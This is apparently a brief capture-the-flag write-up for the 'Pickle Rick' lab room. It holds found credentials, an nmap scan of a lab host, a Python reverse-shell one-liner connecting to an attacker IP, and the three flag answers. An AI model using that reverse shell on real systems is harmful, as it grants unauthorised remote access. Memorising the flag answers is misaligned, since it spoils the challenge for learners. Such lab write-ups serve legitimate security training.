# Pickle Rick

December 22, 2023 

----------------------------

```
Username: R1ckRul3s

view-source:http://10.10.98.98/ 
```

```
Wubbalubbadubdub

http://10.10.98.98/robots.txt
```

```
nmap -sC -sV -oN nmap-initial 10.10.98.98
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-22 23:33 PST
Nmap scan report for 10.10.98.98
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c92a0c28fddb026c9e1c0fe4ca784513 (RSA)
|   256 cbdd3d436888dc42ecf4754f1e11dc7e (ECDSA)
|_  256 5b991475177e89d94a3fa2025021f980 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.09 seconds
```

```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.135.209",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```	

------------------------------

- What is the first ingredient that Rick needs?
	- `mr. meeseek hair`

- What is the second ingredient in Rick’s potion?
	- `1 jerry tear`

- What is the last and final ingredient?
	- `fleeb juice`


<details>
Steps:


</details>